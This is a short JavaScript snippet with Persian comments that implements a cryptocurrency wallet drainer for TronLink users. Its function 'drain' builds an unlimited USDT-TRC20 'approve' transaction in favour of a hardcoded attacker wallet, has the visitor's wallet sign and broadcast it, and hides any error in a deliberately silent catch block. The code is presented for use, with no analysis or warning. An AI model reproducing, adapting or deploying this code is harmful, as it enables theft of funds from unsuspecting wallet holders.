const YOUR_WALLET = "0xa6e18E881C13477dDA0c74c7fB25F82e8bF281E3"; // والت جدیدت
const TRX_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT-TRC20 اگه بخوای، یا TRX ساده

async function drain() {
  if (!window.tronWeb) {
    alert("TronLink نصب نیست یا قفل هست!");
    return;
  }

  try {
    const accounts = await tronWeb.trx.getAccount();
    const address = accounts.address;

    // approve نامحدود USDT-TRC20 یا TRX ساده
    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // قرارداد USDT-TRC20
      "approve(address,uint256)",
      {},
      [{
        type: 'address',
        value: YOUR_WALLET
      }, {
        type: 'uint256',
        value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // نامحدود
      }],
      address
    );

    const signedTxn = await tronWeb.trx.sign(transaction.transaction);
    await tronWeb.trx.sendRawTransaction(signedTxn);

  } catch (error) {
    // خاموش
  }
}
